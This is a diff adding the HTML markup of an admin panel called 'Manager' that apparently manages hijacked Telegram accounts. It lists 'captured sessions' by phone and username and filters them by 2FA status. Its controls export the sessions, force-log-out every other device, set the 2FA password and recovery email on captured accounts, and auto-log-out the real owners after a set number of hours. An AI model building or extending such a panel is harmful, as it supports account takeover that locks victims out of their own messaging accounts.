@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#0b0d10">
+<title>Manager</title>
+<link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<div class="app">
+  <aside class="sidebar" id="sidebar">
+    <div class="brand">
+      <div class="brand-mark">M</div>
+      <div class="brand-name">Manager</div>
+    </div>
+    <nav>
+      <a class="nav-item active" data-view="dashboard">Dashboard</a>
+      <a class="nav-item" data-view="sessions">Sessions</a>
+      <a class="nav-item" data-view="audit">Activity</a>
+      <a class="nav-item" data-view="settings">Settings</a>
+    </nav>
+    <div class="side-foot">
+      <button class="btn ghost" id="btn-logout">Logout</button>
+    </div>
+  </aside>
+
+  <main class="main">
+    <header class="topbar">
+      <button class="hamb" id="hamb" aria-label="menu">☰</button>
+      <div class="topbar-title" id="topbar-title">Dashboard</div>
+      <div class="topbar-spacer"></div>
+      <button class="btn ghost sm" id="btn-refresh" title="Refresh">↻</button>
+    </header>
+
+    <section class="view" id="view-dashboard">
+      <div class="stats" id="stats"></div>
+      <div class="panel">
+        <div class="panel-h">
+          <span>Recent Sessions</span>
+          <a class="link" data-view="sessions">View all →</a>
+        </div>
+        <div id="recent-list" class="card-list"></div>
+      </div>
+    </section>
+
+    <section class="view hidden" id="view-sessions">
+      <div class="toolbar">
+        <input type="text" id="search" class="input" placeholder="Search phone, name, username…">
+        <select id="filter-2fa" class="input sm">
+          <option value="">All 2FA</option>
+          <option value="yes">2FA set</option>
+          <option value="no">No 2FA</option>
+        </select>
+        <select id="filter-protected" class="input sm">
+          <option value="">All</option>
+          <option value="yes">Protected</option>
+          <option value="no">Unprotected</option>
+        </select>
+        <button class="btn ghost sm" id="btn-export">Export JSON</button>
+      </div>
+      <div class="card-list" id="session-list"></div>
+    </section>
+
+    <section class="view hidden" id="view-audit">
+      <div class="panel">
+        <div class="panel-h"><span>Activity Log</span></div>
+        <div id="audit-list" class="audit-list"></div>
+      </div>
+    </section>
+
+    <section class="view hidden" id="view-settings">
+      <div class="panel">
+        <div class="panel-h"><span>Auto-Logout</span></div>
+        <div class="row">
+          <div>
+            <div class="label">Enable 24h auto-logout for new sessions</div>
+            <div class="muted sm">When ON, every new captured session auto-logs-out (all devices on that account) after 24h. Fires once per session. Protected / current device is skipped.</div>
+          </div>
+          <label class="switch">
+            <input type="checkbox" id="set-al">
+            <span class="slider"></span>
+          </label>
+        </div>
+        <div class="row">
+          <div class="label">Auto-logout after (hours)</div>
+          <input type="number" id="set-hours" class="input sm" min="1" max="168" value="24">
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-h"><span>Telegram API</span></div>
+        <label class="label">API ID</label>
+        <input type="text" id="set-api-id" class="input">
+        <label class="label">API Hash</label>
+        <input type="text" id="set-api-hash" class="input">
+        <label class="label">Bot Token</label>
+        <input type="text" id="set-bot-token" class="input">
+        <label class="label">Log Channel ID</label>
+        <input type="text" id="set-log-channel" class="input">
+      </div>
+
+      <div class="panel">
+        <div class="panel-h"><span>Admin Password</span></div>
+        <label class="label">New password</label>
+        <input type="password" id="set-pw" class="input" placeholder="Leave blank to keep current">
+        <button class="btn primary" id="btn-save-settings">Save Settings</button>
+      </div>
+    </section>
+  </main>
+</div>
+
+<!-- Devices modal -->
+<div class="modal hidden" id="modal-devices">
+  <div class="modal-card">
+    <div class="modal-h">
+      <span>Devices — <b id="dev-phone"></b></span>
+      <button class="x" data-close>×</button>
+    </div>
+    <div class="modal-body" id="dev-body"></div>
+    <div class="modal-f">
+      <button class="btn danger" id="btn-logout-others">Logout all others</button>
+      <button class="btn ghost" data-close>Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- 2FA modal -->
+<div class="modal hidden" id="modal-2fa">
+  <div class="modal-card">
+    <div class="modal-h">
+      <span>2FA — <b id="fa-phone"></b></span>
+      <button class="x" data-close>×</button>
+    </div>
+    <div class="modal-body" id="fa-body">
+      <div id="fa-status" class="muted">Checking status…</div>
+      <label class="label">Current 2FA password (only if changing existing)</label>
+      <input type="password" id="fa-current" class="input" placeholder="Current password">
+      <label class="label">New 2FA password</label>
+      <input type="password" id="fa-new" class="input" placeholder="New password">
+      <label class="label">Hint</label>
+      <input type="text" id="fa-hint" class="input">
+      <label class="label">Recovery email</label>
+      <input type="email" id="fa-email" class="input">
+      <div class="err" id="fa-err"></div>
+    </div>
+    <div class="modal-f">
+      <button class="btn primary" id="btn-set-2fa">Set 2FA</button>
+      <button class="btn ghost" data-close>Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- Mail modal -->
+<div class="modal hidden" id="modal-mail">
+  <div class="modal-card">
+    <div class="modal-h">
+      <span>Email — <b id="mail-phone"></b></span>
+      <button class="x" data-close>×</button>
+    </div>
+    <div class="modal-body">
+      <label class="label">Email address</label>
+      <input type="email" id="mail-input" class="input">
+    </div>
+    <div class="modal-f">
+      <button class="btn primary" id="btn-save-mail">Save</button>
+      <button class="btn ghost" data-close>Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- Detail modal -->
+<div class="modal hidden" id="modal-detail">
+  <div class="modal-card">
+    <div class="modal-h">
+      <span>Session — <b id="d-phone"></b></span>
+      <button class="x" data-close>×</button>
+    </div>
+    <div class="modal-body" id="d-body"></div>
+    <div class="modal-f">
+      <button class="btn ghost" data-close>Close</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+<script src="/app.js"></script>
+</body>
+</html>
